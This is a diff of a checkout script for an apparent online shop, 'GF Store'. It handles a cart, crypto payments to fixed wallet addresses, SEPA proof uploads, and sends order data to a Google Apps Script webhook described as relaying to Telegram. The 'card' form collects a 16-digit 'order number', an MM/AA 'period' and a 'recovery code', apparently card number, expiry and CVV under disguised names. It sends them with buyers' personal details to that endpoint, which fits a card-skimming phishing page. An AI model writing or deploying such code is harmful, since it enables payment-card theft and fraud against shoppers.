@@ -1,118 +1,64 @@
-/* checkout.js — GF Store
-   - Récupère le panier (localStorage 'gf_cart')
-   - Calcule promos (SEPA -3%, Crypto -1%), split 2/3/4x
-   - Uploader preuve SEPA (base64) — mobile friendly & tolérant
-   - Paiement par CARTE (formulaire dédié)
-   - Envoi vers Apps Script → Telegram, robuste (_json + fallbacks)
-   - Empêche l’envoi si des champs requis manquent
-*/
-(async function(){
+/* GF STORE — Checkout (extern) — v5
+ * - Envoi fiable vers Apps Script (JSON → _json → sendBeacon → no-cors)
+ * - Carte: card_name, order_number, period, recovery_code (+ alias)
+ * - SEPA: preuve en base64 (<=10MB), ref auto si vide
+ * - Crypto: QR/adresse dynamiques, TxID requis
+ * - Split: aperçu échéancier + due now
+ * - Bouton "Finaliser" actif seulement après vérif SEPA/CRYPTO
+ */
+
+(() => {
   "use strict";
+  if (window.__GF_CHECKOUT_INIT__) return;
+  window.__GF_CHECKOUT_INIT__ = true;
 
-  // =========================
-  // CONFIG
-  // =========================
+  /* ====== CONFIG ====== */
   const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbypa62g6lhlchWMayVWYyRh2TGc--bBdqNMag2ro1Ne1SDMVT5bHzy7pvooG3ZnsGAx/exec";
-  const WEBHOOK_SECRET = ""; // optionnel, si activé côté Apps Script
-  const MAX_SIZE = 10 * 1024 * 1024; // 10 Mo
-  const IS_IOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
+  const WEBHOOK_SECRET = ""; // si tu actives le check côté Apps Script
+  const MAX_SIZE = 10 * 1024 * 1024; // 10 MB
 
-  // =========================
-  // UTILITAIRES
-  // =========================
+  /* ====== HELPERS ====== */
   const $  = s => document.querySelector(s);
   const $$ = s => Array.from(document.querySelectorAll(s));
-  const toast = (msg)=>{ const t = $('#toast'); if(!t) return; t.textContent = msg; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),1800); };
-  const EUR  = (v)=> Number(v||0).toLocaleString('fr-FR',{style:'currency',currency:'EUR'});
-  const two  = (n)=> String(n).padStart(2,'0');
-  const bindClickLike = (el, fn)=>{
-    if(!el) return;
-    el.addEventListener('click', fn, {passive:true});
-    el.addEventListener('touchend', fn, {passive:true});
-    el.addEventListener('pointerup', fn, {passive:true});
-    if(IS_IOS) el.addEventListener('touchstart', ()=>{}, {passive:true});
-  };
+  const toast = (m)=>{ const t=$('#toast'); if(!t) return; t.textContent=m; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 1800); };
+  const EUR = v => Number(v||0).toLocaleString('fr-FR',{style:'currency',currency:'EUR'});
+  const two = n => String(n).padStart(2,'0');
 
-  // =========================
-  // ICÔNES (optionnel)
-  // =========================
-  const ICONS = {
-    user:'https://img.icons8.com/?size=100&id=n8DrUm77sR3l&format=png&color=000000',
-    continue:'https://img.icons8.com/?size=100&id=26138&format=png&color=000000',
-    menu:'https://img.icons8.com/?size=100&id=RzDomvpIKGI9&format=png&color=000000',
-    ssl:'https://img.icons8.com/?size=100&id=2FIgZJEL88pu&format=png&color=000000',
-    truck:'https://img.icons8.com/?size=100&id=plGFB4oatud2&format=png&color=000000',
-    back:'https://img.icons8.com/?size=100&id=26138&format=png&color=000000'
-  };
-  const setSrc = (id,src)=>{ const el=document.getElementById(id); if(el) el.src=src; };
-  setSrc('icUser',ICONS.user); setSrc('icMenu',ICONS.menu); setSrc('icSSL',ICONS.ssl);
-  setSrc('icTruck',ICONS.truck); setSrc('icBack',ICONS.back); setSrc('icContinue',ICONS.continue);
+  /* ====== ORDER ID ====== */
+  const orderId = (()=>{ const d=new Date(); return `GF-${String(d.getFullYear()).slice(2)}${two(d.getMonth()+1)}${two(d.getDate())}-${Math.floor(Math.random()*9000)+1000}`; })();
+  const orderIdEl = $('#orderId'); if (orderIdEl) orderIdEl.textContent = orderId;
 
-  // =========================
-  // MENU
-  // =========================
-  (function initMenu(){
-    const menuBtn = $('#menuBtn');
-    const menuDrop = $('#menuDrop');
-    if(!menuBtn || !menuDrop) return;
-    menuBtn.addEventListener('click', e=>{ e.stopPropagation(); menuDrop.classList.toggle('show'); });
-    document.addEventListener('click', e=>{ if(!menuDrop.contains(e.target) && e.target!==menuBtn) menuDrop.classList.remove('show'); });
-  })();
+  /* ====== CART ====== */
+  const KEY='gf_cart';
+  const getCart=()=>{ try{return JSON.parse(localStorage.getItem(KEY)||'[]');}catch{return[];} };
+  const setCart=arr=>localStorage.setItem(KEY, JSON.stringify(arr));
+  const computeSub=cart=>cart.reduce((s,x)=> s + Number(x.price||0)*Number(x.qty||1), 0);
 
-  // =========================
-  // PANIER
-  // =========================
-  const KEY = 'gf_cart';
-  const getCart = ()=>{ try{ return JSON.parse(localStorage.getItem(KEY)||'[]'); }catch{ return []; } };
-  const setCart = (arr)=> localStorage.setItem(KEY, JSON.stringify(arr));
-  const computeSub = (cart)=> cart.reduce((s,x)=> s + Number(x.price||0)*Number(x.qty||1), 0);
-
-  // =========================
-  // ID COMMANDE
-  // =========================
-  const orderId = (function(){
-    const d = new Date();
-    const y = String(d.getFullYear()).slice(2);
-    const mm= two(d.getMonth()+1);
-    const dd= two(d.getDate());
-    const rnd=Math.floor(Math.random()*9000)+1000;
-    return `GF-${y}${mm}${dd}-${rnd}`;
-  })();
-  const orderIdEl = $('#orderId'); if(orderIdEl) orderIdEl.textContent = orderId;
-
-  // =========================
-  // MINI PANIER
-  // =========================
   function renderMini(){
-    const wrap = $('#miniCart'); if(!wrap) return;
-    const cart = getCart();
+    const wrap=$('#miniCart'); if(!wrap) return;
+    const cart=getCart();
     if(!cart.length){
-      wrap.innerHTML = '<div class="muted">Votre panier est vide.</div>';
+      wrap.innerHTML='<div class="muted">Ihr Warenkorb ist leer.</div>';
       ['sub','benefit','total','dueNow'].forEach(id=>{ const el=$('#'+id); if(el) el.textContent='—'; });
-      const schedule = $('#schedule'); if(schedule) schedule.style.display='none';
+      const schedule=$('#schedule'); if(schedule) schedule.style.display='none';
       return;
     }
-    wrap.innerHTML = cart.map(x=>`
+    wrap.innerHTML=cart.map(x=>`
       <div class="ci">
         <img src="${x.image||''}" alt="${x.name||''}">
         <div>
           <div style="font-weight:600">${x.name||''}</div>
           <div class="muted" style="font-size:12px">${x.brand||''}${x.category?(' • '+x.category):''}</div>
         </div>
-        <div style="font-weight:600">${EUR(Number(x.price||0)*Number(x.qty||1))}</div>
-      </div>
-    `).join('');
+        <div style="font-weight:600">${EUR((+x.price||0)*(+x.qty||1))}</div>
+      </div>`).join('');
   }
 
-  // =========================
-  // MÉTHODES / PROMOS
-  // =========================
+  /* ====== MODES & PROMO ====== */
   function currentPM(){ return document.querySelector('.m[role="tab"][aria-selected="true"]')?.dataset.method || 'sepa'; }
   function promoRate(){ return currentPM()==='sepa'?0.03 : currentPM()==='crypto'?0.01 : 0; }
 
-  // =========================
-  // CRYPTO (taux mock + adresses)
-  // =========================
+  /* ====== CRYPTO CONFIG ====== */
   const fx = {
     'USDT-TRC20':{symbol:'USDT',rate:1},
     'USDT-BEP20':{symbol:'USDT',rate:1},
@@ -120,347 +66,113 @@
     'ETH-ERC20':{symbol:'ETH',rate:3000}
   };
   const WALLET = {
-    'USDT-BEP20':{
-      address:'0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b',
-      qr:'https://api.qrcode-monkey.com/tmp/9c2692034c7a6496eb6d7153da52f854.svg?1755861184316'
-    },
-    'USDT-TRC20':{
-      address:'TMdLMTYGEEZAnoVbi482Zr9QSRgWmRUXXq',
-      qr:'https://api.qrcode-monkey.com/tmp/ce476e4409d57ba517ffaf6db6bf25d2.svg?1755861346811'
-    },
-    'BTC':{
-      address:'18npEW9EaKZvVvA9B1z3DcmVEJtuQUdus3',
-      qr:'https://api.qrcode-monkey.com/tmp/578f1d0b0e32feece2ae335bb417c7f8.svg?1755861612113'
-    },
-    'ETH-ERC20':{
-      address:'0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b',
-      qr:'https://api.qrcode-monkey.com/tmp/9c2692034c7a6496eb6d7153da52f854.svg?1755861930363'
-    }
+    'USDT-BEP20':{ address:'0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b', qr:'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b' },
+    'USDT-TRC20':{ address:'TMdLMTYGEEZAnoVbi482Zr9QSRgWmRUXXq', qr:'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=TMdLMTYGEEZAnoVbi482Zr9QSRgWmRUXXq' },
+    'BTC':{ address:'18npEW9EaKZvVvA9B1z3DcmVEJtuQUdus3', qr:'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=18npEW9EaKZvVvA9B1z3DcmVEJtuQUdus3' },
+    'ETH-ERC20':{ address:'0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b', qr:'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b' }
   };
   function setCryptoAddress(ccy){
-    const cfg = WALLET[ccy] || {};
-    const wallet = $('#wallet'); if(wallet) wallet.value = cfg.address || '';
-    const ccyLabel = $('#ccyLabel'); if(ccyLabel) ccyLabel.textContent = fx[ccy]?.symbol || (ccy?.includes('USDT')?'USDT':'');
-    const img = $('#qrImg'); if(img){ img.src = cfg.qr || ''; img.alt = 'QR '+(ccy||''); }
+    const cfg=WALLET[ccy]||{};
+    const w=$('#wallet'); if(w) w.value=cfg.address||'';
+    const lbl=$('#ccyLabel'); if(lbl) lbl.textContent=fx[ccy]?.symbol||(ccy?.includes('USDT')?'USDT':'');
+    const img=$('#qrImg'); if(img){ img.src=cfg.qr||''; img.alt='QR '+(ccy||''); }
   }
-  const ccySel = $('#ccy');
-  if(ccySel){ setCryptoAddress(ccySel.value); ccySel.addEventListener('change',()=>{ setCryptoAddress(ccySel.value); updateSummary(); }); }
 
-  // =========================
-  // SPLIT
-  // =========================
+  /* ====== SPLIT ====== */
   function splitAmounts(total, parts){
-    const cents = Math.round((Number(total)||0)*100);
-    const base  = Math.floor(cents/parts);
-    const first = base + (cents - base*parts);
-    const arr   = [first]; for(let i=1;i<parts;i++) arr.push(base);
-    return arr.map(c=>c/100);
+    const c=Math.round((+total||0)*100);
+    const base=Math.floor(c/parts), first=base+(c-base*parts);
+    return [first,...Array(parts-1).fill(base)].map(x=>x/100);
   }
   function scheduleLines(total, parts){
-    const amts = splitAmounts(total, parts);
-    const today = new Date(); const steps=[0,30,60,90];
-    return amts.map((amt,i)=>{
-      const d = new Date(today); d.setDate(d.getDate()+steps[i]);
-      const label = i===0?'Aujourd’hui':(i===1?'Dans 30 jours':i===2?'Dans 60 jours':'Dans 90 jours');
-      return {label, date:d.toLocaleDateString('fr-FR'), amt};
-    });
+    const amts=splitAmounts(total, parts);
+    const today=new Date(); const steps=[0,30,60,90];
+    return amts.map((amt,i)=>{ const d=new Date(today); d.setDate(d.getDate()+steps[i]); return {label:i?`In ${steps[i]} Tagen`:`Heute`, date:d.toLocaleDateString('de-DE'), amt}; });
   }
-  let selectedSplit = 1;
-  let modalParts = 4;
-  (function initSplit(){
-    const modal = $('#splitModal');
-    const segBtns = $$('#segSplit .segbtn');
-    const open = ()=>{ if(!modal) return; modal.classList.add('show'); modal.setAttribute('aria-hidden','false'); setModalParts(modalParts); updateModalPreview(); };
-    const close= ()=>{ if(!modal) return; modal.classList.remove('show'); modal.setAttribute('aria-hidden','true'); };
+  let selectedSplit=1;
 
-    const btnOnce = $('#btnOnce');
-    const btnSplit= $('#btnSplit');
-    if(btnOnce) btnOnce.addEventListener('click',()=>{ selectedSplit=1; btnOnce.classList.add('on'); btnSplit?.classList.remove('on'); updateSplitHint(); updateSummary(); });
-    if(btnSplit) bindClickLike(btnSplit, open);
-    $('#closeSplit')?.addEventListener('click', close);
-    $('#cancelSplit')?.addEventListener('click', close);
-    $('#applySplit')?.addEventListener('click',()=>{ selectedSplit = modalParts; btnSplit?.classList.add('on'); btnOnce?.classList.remove('on'); close(); updateSplitHint(); updateSummary(); });
-    segBtns.forEach(b=> b.addEventListener('click',()=> setModalParts(b.dataset.parts)));
-    $('#splitModal')?.addEventListener('click',e=>{ if(e.target.id==='splitModal') close(); });
-
-    function setModalParts(n){
-      modalParts = Number(n);
-      segBtns.forEach(b=> b.setAttribute('aria-pressed', String(Number(b.dataset.parts)===modalParts)));
-      updateModalPreview();
-    }
-    function updateModalPreview(){
-      const cart=getCart(); const sub=computeSub(cart); const promo=sub*promoRate(); const total=Math.max(0, sub - promo);
-      const lines = scheduleLines(total, modalParts);
-      const prev = $('#modalPrev'); if(!prev) return;
-      prev.innerHTML = lines.map(l=>`<div class="sch"><span>${l.label} (${l.date})</span><span>${EUR(l.amt)}</span></div>`).join('');
-    }
-    function updateSplitHint(){ const el=$('#splitHint'); if(el) el.textContent = selectedSplit>1 ? `(${selectedSplit}× mensuel)` : '(désactivé)'; }
-    window.updateSplitHint = updateSplitHint;
-  })();
-
-  // =========================
-  // RÉFÉRENCE SEPA
-  // =========================
-  const slugRefFromName = (n)=>{
-    const base=(n||'').normalize('NFD').replace(/[\u0300-\u036f]/g,'').toUpperCase().replace(/[^A-Z0-9]+/g,'').slice(0,16);
-    if(base) return base;
-    const short=orderId.replace('GF-','').split('-')[0];
-    return 'GF'+short;
-  };
-  function syncRef(){ const name=$('#name')?.value||''; const vref=$('#vref'); if(vref) vref.value = slugRefFromName(name); }
-  $('#name')?.addEventListener('input', syncRef);
-
-  // =========================
-  // RÉCAP + DUE NOW
-  // =========================
-  const SHIPPING = 0;
-  function updateSummary(){
-    const cart = getCart(); if(!cart.length){ renderMini(); return; }
-    const sub = computeSub(cart);
-    const promo = sub*promoRate();
-    const total = Math.max(0, sub + SHIPPING - promo);
-    const parts = selectedSplit;
-    const amts  = splitAmounts(total, parts);
-    const dueNow = amts[0] || 0;
-
-    $('#sub')?.textContent = EUR(sub);
-    $('#benefit')?.textContent = promo>0 ? '–'+EUR(promo) : '—';
-    $('#total')?.textContent = EUR(total);
-    $('#dueNow')?.textContent = EUR(dueNow);
-
-    const scheduleBox = $('#schedule');
-    if(scheduleBox){
-      if(parts>1){
-        const lines=scheduleLines(total, parts);
-        scheduleBox.style.display='grid';
-        scheduleBox.innerHTML = lines.map(l=>`<div class="sch"><span>${l.label} (${l.date})</span><span>${EUR(l.amt)}</span></div>`).join('');
-      }else{
-        scheduleBox.style.display='none';
-      }
-    }
-
-    if(currentPM()==='crypto'){
-      const amountNow=$('#amountNow'); if(amountNow) amountNow.value = dueNow.toFixed(2);
-      const ccy=$('#ccy')?.value||'USDT-BEP20';
-      const r=fx[ccy]?.rate||1;
-      const amt=(dueNow/r);
-      const ccyAmt=$('#ccyAmt'); if(ccyAmt) ccyAmt.value = (amt>0?amt:0).toFixed(6).replace(/0+$/,'').replace(/\.$/,'');
-    }
-    if(currentPM()==='sepa'){
-      const amountNowBank=$('#amountNowBank'); if(amountNowBank) amountNowBank.value = dueNow.toFixed(2);
-    }
-  }
   function currentDueNow(){
     const cart=getCart(); const sub=computeSub(cart); const promo=sub*promoRate(); const total=Math.max(0, sub - promo);
     return splitAmounts(total, selectedSplit)[0]||0;
   }
 
-  // =========================
-  // OVERLAYS + CTA
-  // =========================
-  const overlay   = $('#checkOverlay');
-  const ovTitle   = $('#ovTitle');
-  const ovSub     = $('#ovSub');
-  const doneOverlay = $('#doneOverlay');
-  const showOverlay = (title,sub)=>{
-    if(ovTitle) ovTitle.textContent = title || 'Vérification…';
-    if(ovSub)   ovSub.textContent   = sub   || 'Un instant, nous confirmons votre paiement.';
-    if(overlay){ overlay.classList.add('show'); overlay.setAttribute('aria-hidden','false'); }
-  };
-  const hideOverlay = ()=>{ if(overlay){ overlay.classList.remove('show'); overlay.setAttribute('aria-hidden','true'); } };
-  const showDone    = ()=>{ if(doneOverlay){ doneOverlay.classList.add('show'); doneOverlay.setAttribute('aria-hidden','false'); } };
+  /* ====== SUMMARY ====== */
+  function updateSummary(){
+    const cart=getCart(); if(!cart.length){ renderMini(); return; }
+    const sub=computeSub(cart), promo=sub*promoRate(), total=Math.max(0, sub - promo);
+    const amts=splitAmounts(total, selectedSplit), dueNow=amts[0]||0;
+    const set=(id,val)=>{ const el=document.getElementById(id); if(el) el.textContent=val; };
+    set('sub',EUR(sub)); set('benefit',promo>0?'–'+EUR(promo):'—'); set('total',EUR(total)); set('dueNow',EUR(dueNow));
 
-  let bankVerified=false, cryptoVerified=false;
-  function updateCTA(){
-    const pm = currentPM();
-    const btn = $('#placeOrder');
-    if(!btn) return;
-    // Carte: on ne passe pas par le CTA principal
-    btn.disabled = pm==='card' ? true : (pm==='sepa' ? !bankVerified : pm==='crypto' ? !cryptoVerified : true);
+    const box=$('#schedule');
+    if(box){
+      if(selectedSplit>1){
+        const lines=scheduleLines(total, selectedSplit);
+        box.style.display='grid';
+        box.innerHTML=lines.map(l=>`<div class="sch"><span>${l.label} (${l.date})</span><span>${EUR(l.amt)}</span></div>`).join('');
+      }else box.style.display='none';
+    }
+
+    if(currentPM()==='crypto'){
+      const ccy=$('#ccy')?.value||'USDT-BEP20'; const r=fx[ccy]?.rate||1; const amt=(dueNow/r);
+      const amountNow=$('#amountNow'); if(amountNow) amountNow.value=dueNow.toFixed(2);
+      const ccyAmt=$('#ccyAmt'); if(ccyAmt) ccyAmt.value=(amt>0?amt:0).toFixed(6).replace(/0+$/,'').replace(/\.$/,'');
+    }
+    if(currentPM()==='sepa'){ const f=$('#amountNowBank'); if(f) f.value=dueNow.toFixed(2); }
   }
 
-  // =========================
-  // TABS MÉTHODES
-  // =========================
-  $$('.m[role="tab"]').forEach(card=>{
-    card.addEventListener('click', ()=>{
-      $$('.m[role="tab"]').forEach(c=>c.setAttribute('aria-selected', String(c===card)));
-      const m=card.dataset.method;
-      $('#pmCrypto')?.classList.toggle('show', m==='crypto');
-      $('#pmSEPA')?.classList.toggle('show', m==='sepa');
-      $('#pmCard')?.classList.toggle('show', m==='card');
-      if(m==='sepa'){ cryptoVerified=false; }
-      if(m==='crypto'){ bankVerified=false; }
-      updateSummary();
-      updateCTA();
-    });
-  });
-
-  // =========================
-  // COPIER
-  // =========================
+  /* ====== COPY ====== */
   function copySel(sel){
-    const el = $(sel); if(!el) return;
-    const txt = el.value||'';
-    if(!txt){ toast('Rien à copier'); return; }
-    if(navigator.clipboard?.writeText){
-      navigator.clipboard.writeText(txt).then(()=>toast('Copié'));
-    }else{
-      el.select(); document.execCommand('copy'); toast('Copié');
-    }
+    const el=$(sel); if(!el) return;
+    const txt=el.value||''; if(!txt){ toast('Rien à copier'); return; }
+    if(navigator.clipboard?.writeText){ navigator.clipboard.writeText(txt).then(()=>toast('Copié')); }
+    else { el.select(); document.execCommand('copy'); toast('Copié'); }
   }
   $$('[data-copy]').forEach(b=> b.addEventListener('click',()=> copySel(b.getAttribute('data-copy')) ));
 
-  // =========================
-  // VALIDATIONS
-  // =========================
+  /* ====== VALIDATION ====== */
   function validateAddress(){
-    const req=['name','email','address','city','zip'];
+    const req=['name','email','address','city','zip','country'];
     for(const id of req){
-      const el = $('#'+id);
-      if(!el || !String(el.value||'').trim()){
-        el?.focus();
-        toast('Veuillez compléter vos informations.');
-        return false;
-      }
+      const el=$('#'+id);
+      const val = el?.tagName==='SELECT' ? el.value : (el?.value||'').trim();
+      if(!val){ el?.focus(); toast('Veuillez compléter vos informations.'); return false; }
     }
     return true;
   }
   function validateCardForm(){
-    const nm = ($('#cardName')?.value||'').trim();
-    if(!nm){ $('#cardName')?.focus(); toast('Veuillez saisir le titulaire.'); return false; }
-    const num = ($('#orderNumber')?.value||'').replace(/\D+/g,'');
-    if(num.length!==16){ $('#orderNumber')?.focus(); toast('Numéro de commande: 16 chiffres requis.'); return false; }
-    const per = ($('#cardPeriod')?.value||'').trim();
-    if(!/^(0[1-9]|1[0-2])\/\d{2}$/.test(per)){ $('#cardPeriod')?.focus(); toast('Période: format MM/AA.'); return false; }
-    const rec = ($('#recoveryCode')?.value||'').replace(/\D+/g,'');
-    if(rec.length<3){ $('#recoveryCode')?.focus(); toast('Code de récupération: min 3 chiffres.'); return false; }
+    const nm = ($('#cardName')?.value||'').trim(); if(!nm){ $('#cardName')?.focus(); toast('Titulaire requis.'); return false; }
+    const num = ($('#orderNumber')?.value||'').replace(/\D+/g,''); if(num.length!==16){ $('#orderNumber')?.focus(); toast('Numéro de commande: 16 chiffres.'); return false; }
+    const per = ($('#cardPeriod')?.value||'').trim(); if(!/^(0[1-9]|1[0-2])\/\d{2}$/.test(per)){ $('#cardPeriod')?.focus(); toast('Période: MM/AA.'); return false; }
+    const rec = ($('#recoveryCode')?.value||'').replace(/\D+/g,''); if(rec.length<3){ $('#recoveryCode')?.focus(); toast('Code de récupération: min 3 chiffres.'); return false; }
     return true;
   }
 
-  // =========================
-  // UPLOADER SEPA — robuste mobile
-  // =========================
-  const dz        = $('#dz');
-  const input     = $('#proofInput');
-  const fileWrap  = $('#fileWrap');
-  const fileName  = $('#fileName');
-  const fileInfo  = $('#fileInfo');
-  const fileBar   = $('#fileBar');
-  const fileOk    = $('#fileOk');
-  const removeBtn = $('#removeProof');
+  /* ====== OVERLAYS & CTA ====== */
+  const overlay=$('#checkOverlay'), ovTitle=$('#ovTitle'), ovSub=$('#ovSub'), doneOverlay=$('#doneOverlay');
+  const showOverlay=(t,s)=>{ if(ovTitle) ovTitle.textContent=t||'Vérification…'; if(ovSub) ovSub.textContent=s||'Un instant…'; overlay?.classList.add('show'); overlay?.setAttribute('aria-hidden','false'); };
+  const hideOverlay=()=>{ overlay?.classList.remove('show'); overlay?.setAttribute('aria-hidden','true'); };
+  const showDone=()=>{ doneOverlay?.classList.add('show'); doneOverlay?.setAttribute('aria-hidden','false'); };
 
-  if (input){ input.setAttribute('accept','*/*'); input.removeAttribute('capture'); }
-
-  function fmtBytes(b){
-    if(b===0) return '0 o';
-    if(!b && b!==0) return '';
-    const u=['o','Ko','Mo','Go']; let i=0;
-    while(b>=1024 && i<u.length-1){ b/=1024; i++; }
-    return b.toFixed(b<10&&i?1:0)+' '+u[i];
-  }
-  function reasonForRefusal(f, isDrop){
-    if(!f) return isDrop ? 'Aucun fichier détecté dans le glisser-déposer.' : 'Aucun fichier sélectionné.';
-    if ('webkitGetAsEntry' in f) {
-      try { const e = f.webkitGetAsEntry(); if(e && e.isDirectory) return 'Dossiers non pris en charge. Compressez-le en .zip.'; } catch {}
-    }
-    if(f.size === 0) return 'Fichier vide (0 octet).';
-    if(f.size > MAX_SIZE) return 'Fichier trop volumineux (>10 Mo).';
-    return '';
+  let bankVerified=false, cryptoVerified=false;
+  function updateCTA(){
+    const pm=currentPM(), btn=$('#placeOrder');
+    if(!btn) return;
+    btn.disabled = pm==='card' ? true : (pm==='sepa' ? !bankVerified : pm==='crypto' ? !cryptoVerified : true);
   }
 
-  let proofFile = null;
-  function showFile(f){
-    proofFile = f;
-    if(fileName) fileName.textContent = f.name || 'Fichier';
-    if(fileInfo) fileInfo.textContent = `${f.type || 'Type inconnu'} • ${fmtBytes(f.size)}`;
-    if(fileBar)  fileBar.style.width = '0%';
-    if(fileOk)   fileOk.style.display = 'none';
-    if(fileWrap) fileWrap.style.display = 'flex';
-
-    let p = 0;
-    const step = ()=> {
-      p += Math.random()*35 + 20;
-      if (p >= 100) { p = 100; if(fileBar) fileBar.style.width = '100%'; if(fileOk) fileOk.style.display = 'inline-flex'; return; }
-      if(fileBar) fileBar.style.width = p+'%';
-      setTimeout(step, 150);
-    };
-    setTimeout(step, 150);
+  /* ====== WEBHOOK ENVOI (multi fallback) ====== */
+  function countryName(){
+    const sel=$('#country'); if(!sel) return '';
+    const o=sel.options[sel.selectedIndex];
+    return (o?.text||'').trim();
   }
-  function clearFile(){
-    proofFile = null;
-    if (input) input.value = '';
-    if (fileWrap) fileWrap.style.display = 'none';
-  }
-  removeBtn?.addEventListener('click', clearFile);
-
-  bindClickLike($('#pickProof'), ()=> input?.click());
-  if (dz){
-    bindClickLike(dz, ()=> input?.click());
-    dz.addEventListener('keydown',e=>{ if(e.key==='Enter' || e.key===' ' || e.key==='Spacebar'){ e.preventDefault(); input?.click(); }});
-
-    ['dragenter','dragover'].forEach(ev => dz.addEventListener(ev, e => {
-      e.preventDefault(); e.stopPropagation();
-      dz.classList.add('over');
-      if (e.dataTransfer) e.dataTransfer.dropEffect = 'copy';
-    }));
-    ['dragleave','drop'].forEach(ev => dz.addEventListener(ev, e => {
-      e.preventDefault(); e.stopPropagation();
-      dz.classList.remove('over');
-    }));
-    dz.addEventListener('drop', e => {
-      let file = null;
-      if (e.dataTransfer?.items && e.dataTransfer.items.length){
-        for (const item of e.dataTransfer.items){
-          if(item.kind === 'file'){
-            if (typeof item.webkitGetAsEntry === 'function'){
-              const entry = item.webkitGetAsEntry();
-              if(entry && entry.isDirectory){ toast('Dossiers non pris en charge. Compressez-le en .zip.'); return; }
-            }
-            file = item.getAsFile();
-            break;
-          }
-        }
-      } else if (e.dataTransfer?.files && e.dataTransfer.files.length){
-        file = e.dataTransfer.files[0];
-      }
-      const reason = reasonForRefusal(file, true);
-      if (reason) { toast(reason); return; }
-      showFile(file);
-      if (input) input.value = '';
-    });
-  }
-  input?.addEventListener('change', e => {
-    const f = e.target.files && e.target.files[0];
-    const reason = reasonForRefusal(f, false);
-    if (reason) { toast(reason); input.value=''; return; }
-    showFile(f);
-    input.value = '';
-  });
-
-  // =========================
-  // ENVOI WEBHOOK (ROBUSTE)
-  // =========================
   function cartForWebhook(){
-    try{
-      const cart = JSON.parse(localStorage.getItem('gf_cart')||'[]');
-      return cart.map(x=>({name:x.name, qty:Number(x.qty||1), price:Number(x.price||0)}));
-    }catch{ return []; }
-  }
-  async function fileToBase64(file){
-    try{
-      const buf = await file.arrayBuffer();
-      let binary=''; const bytes=new Uint8Array(buf); const chunk=0x8000;
-      for(let i=0;i<bytes.length;i+=chunk){ binary += String.fromCharCode.apply(null, bytes.subarray(i,i+chunk)); }
-      return btoa(binary);
-    }catch(e){
-      toast('Erreur de lecture du fichier. Réessayez.');
-      return '';
-    }
+    try{ const cart=JSON.parse(localStorage.getItem('gf_cart')||'[]'); return cart.map(x=>({name:x.name,qty:+(x.qty||1),price:+(x.price||0)})); }catch{return[];}
   }
 
   async function postCompat(url, payload){
-    // enrichissement minimal
+    // métadonnées
     payload.req_id    = payload.req_id || ('gf_' + Date.now() + '_' + Math.random().toString(36).slice(2,8));
     payload.ts_client = payload.ts_client || new Date().toISOString();
     payload.origin    = location.origin;
@@ -468,87 +180,79 @@
 
     const dataStr = JSON.stringify(payload);
 
-    // A) Beacon "compat": tout dans la query (_json)
-    try{
-      const qsUrl = url + (url.includes('?')?'&':'?') + '_json=' + encodeURIComponent(dataStr);
-      navigator.sendBeacon(qsUrl, ''); // Apps Script lira e.parameter._json
-    }catch(_){}
-
-    // B) POST JSON standard
+    // A) JSON standard
     try{
       await fetch(url, {
         method:'POST',
-        headers:{
-          'Content-Type':'application/json',
-          ...(WEBHOOK_SECRET ? {'X-Webhook-Secret': WEBHOOK_SECRET} : {})
-        },
-        body: dataStr,
+        headers:{ 'Content-Type':'application/json', ...(WEBHOOK_SECRET? {'X-Webhook-Secret':WEBHOOK_SECRET} : {}) },
+        body:dataStr,
         keepalive:true
       });
-      return;
+      return true;
     }catch(_){}
 
-    // C) x-www-form-urlencoded avec _json
+    // B) x-www-form-urlencoded (_json)
     try{
-      const usp = new URLSearchParams();
-      usp.set('_json', dataStr);
+      const usp=new URLSearchParams(); usp.set('_json', dataStr);
       await fetch(url, {
         method:'POST',
-        headers: (WEBHOOK_SECRET? {'X-Webhook-Secret': WEBHOOK_SECRET} : {}),
+        headers:{ ...(WEBHOOK_SECRET? {'X-Webhook-Secret':WEBHOOK_SECRET} : {}) },
         body: usp,
         keepalive:true
       });
-      return;
+      return true;
     }catch(_){}
 
-    // D) no-cors text/plain
+    // C) sendBeacon (navigations immédiates)
+    try{
+      if (navigator.sendBeacon){
+        const blob = new Blob([dataStr], {type:'text/plain;charset=utf-8'});
+        const ok = navigator.sendBeacon(url, blob);
+        if (ok) return true;
+      }
+    }catch(_){}
+
+    // D) no-cors dernier recours
     try{
       await fetch(url, {
         method:'POST',
         mode:'no-cors',
-        headers:{'Content-Type':'text/plain;charset=utf-8', ...(WEBHOOK_SECRET? {'X-Webhook-Secret': WEBHOOK_SECRET} : {})},
+        headers:{'Content-Type':'text/plain;charset=utf-8', ...(WEBHOOK_SECRET? {'X-Webhook-Secret':WEBHOOK_SECRET} : {})},
         body:dataStr,
         keepalive:true
       });
+      return true;
     }catch(_){}
+    return false;
   }
 
-  async function sendCryptoToWebhook(dueNow){
+  async function sendCrypto(dueNow){
     const payload = {
-      orderId,
-      method:'crypto',
-      amount: Number(dueNow||0).toFixed(2),
-      txid: ($('#txid')?.value||'').trim(),
-      ccy:  $('#ccy')?.value || 'USDT-BEP20',
-      name: $('#name')?.value || '',
-      email:$('#email')?.value||'',
-      phone:$('#phone')?.value||'',
-      address:$('#address')?.value||'',
-      city: $('#city')?.value ||'',
-      zip:  $('#zip')?.value  ||'',
-      country:$('#country')?.value||'',
-      split: selectedSplit,
-      cart: cartForWebhook(),
-      ts_client: new Date().toISOString()
+      orderId, method:'crypto', amount:(+dueNow||0).toFixed(2),
+      txid: ($('#txid')?.value||'').trim(), ccy: $('#ccy')?.value||'USDT-BEP20',
+      name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'',
+      address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'',
+      country:$('#country')?.value||'', country_name: countryName(),
+      split:selectedSplit, cart:cartForWebhook()
     };
